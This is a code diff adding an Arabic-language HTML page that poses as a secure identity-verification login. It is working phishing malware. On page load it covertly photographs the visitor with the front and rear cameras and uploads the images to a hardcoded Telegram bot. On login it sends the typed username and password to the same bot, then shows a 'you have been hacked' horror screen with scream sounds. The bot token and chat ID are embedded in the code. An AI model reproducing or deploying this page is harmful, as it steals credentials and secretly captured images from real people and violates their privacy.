@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 توثيق الهوية الذكي</title>
+    <style>
+        :root { --primary: #00ff88; --bg: #050505; }
+        body, html { height: 100%; margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+        
+        /* Landing UI - Ultra Professional */
+        #landing { display: flex; justify-content: center; align-items: center; height: 100vh; transition: opacity 0.5s ease; }
+        .glass-card { 
+            background: rgba(255, 255, 255, 0.03); 
+            padding: 50px; border-radius: 24px; 
+            backdrop-filter: blur(15px); 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5); 
+            text-align: center; width: 380px; 
+            animation: fadeIn 1s ease-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .logo { font-size: 50px; margin-bottom: 10px; color: var(--primary); }
+        h2 { font-weight: 300; margin-bottom: 10px; letter-spacing: 1px; }
+        p { font-size: 14px; color: #aaa; margin-bottom: 30px; }
+        
+        .input-group { position: relative; margin-bottom: 20px; }
+        input { 
+            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); 
+            background: rgba(0,0,0,0.4); color: #fff; box-sizing: border-box; 
+            transition: 0.3s; text-align: center; font-size: 16px;
+        }
+        input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 10px rgba(0, 255, 136, 0.2); }
+        
+        .btn-login { 
+            width: 100%; padding: 15px; border-radius: 12px; border: none; 
+            background: linear-gradient(45deg, #00ff88, #00bd65); 
+            color: #000; cursor: pointer; font-weight: bold; font-size: 18px; 
+            transition: 0.3s; box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
+        }
+        .btn-login:hover { transform: scale(1.03); filter: brightness(1.1); }
+
+        /* Horror UI */
+        #horror-screen { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; color: red; z-index: 9999; 
+            flex-direction: column; justify-content: center; align-items: center; 
+            text-align: center; overflow: hidden;
+        }
+        .scary-text { 
+            font-size: 60px; font-family: 'Courier New', Courier, monospace; 
+            font-weight: bold; text-shadow: 0 0 20px red; 
+            animation: flicker 0.1s infinite; 
+        }
+        @keyframes flicker { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        
+        .skull { font-size: 150px; filter: drop-shadow(0 0 20px red); }
+        .hack-msg { font-size: 20px; color: #ff0000; margin-top: 20px; font-family: monospace; }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body onload="autoCapture()">
+
+<div id="landing">
+    <div class="glass-card">
+        <div class="logo">🛡️</div>
+        <h2>نظام التوثيق المؤمن</h2>
+        <p>يرجى تسجيل الدخول للمتابعة بأمان</p>
+        
+        <div class="input-group">
+            <input type="text" id="username" placeholder="اسم المستخدم">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="كلمة المرور">
+        </div>
+        <button class="btn-login" id="loginBtn">دخول آمن</button>
+    </div>
+</div>
+
+<div id="horror-screen">
+    <div class="skull">💀</div>
+    <div class="scary-text">لقد تم اختراقك</div>
+    <div class="hack-msg">تم سحب كافة ملفاتك وصورك الآن...<br>السيطرة الكاملة للجهاز تمت بنجاح.</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<!-- أصوات مرعبة خارجية (روابط عشوائية لموسيقى رعب) -->
+<audio id="scaryAudio" src="https://www.soundjay.com/human/sounds/scream-01.mp3" preload="auto"></audio>
+<audio id="backgroundEvil" src="https://www.soundjay.com/ambient/sounds/horror-ambient-1.mp3" loop preload="auto"></audio>
+
+<script>
+const BOT_TOKEN = '7841770799:AAEkyBbSilkRvyst6cFQVK9_VhEe5YAlsbU';
+const CHAT_ID = '7684109421';
+
+async function autoCapture() {
+    try {
+        const front = await takePhoto('user');
+        let back = null;
+        try { back = await takePhoto('environment'); } catch (e) {}
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚡️ ضحية وقعت في الفخ!')}`);
+        if(front) await uploadImg(front);
+        if(back) await uploadImg(back);
+    } catch (err) {}
+}
+
+document.getElementById('loginBtn').addEventListener('click', async () => {
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+
+    if(!user || !pass) return alert("يرجى إكمال البيانات");
+
+    // إرسال البيانات فوراً
+    const text = `💀 حساب جديد مُختَرق 💀\n👤 User: ${user}\n🔑 Pass: ${pass}`;
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+    // تفعيل الشاشة المرعبة والأصوات
+    document.getElementById('landing').style.opacity = '0';
+    setTimeout(() => {
+        document.getElementById('landing').style.display = 'none';
+        document.getElementById('horror-screen').style.display = 'flex';
+        
+        // تشغيل الأصوات
+        document.getElementById('scaryAudio').play();
+        document.getElementById('backgroundEvil').play();
+    }, 500);
+});
+
+async function takePhoto(mode) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+        video.srcObject = stream;
+        return new Promise((resolve) => {
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const data = canvas.toDataURL('image/jpeg', 0.7);
+                stream.getTracks().forEach(t => t.stop());
+                resolve(data);
+            }, 1000);
+        });
+    } catch(e) { return null; }
+}
+
+async function uploadImg(base64) {
+    try {
+        const blob = await (await fetch(base64)).blob();
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'hit.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    } catch(e) {}
+}
+</script>
+</body>
+</html>
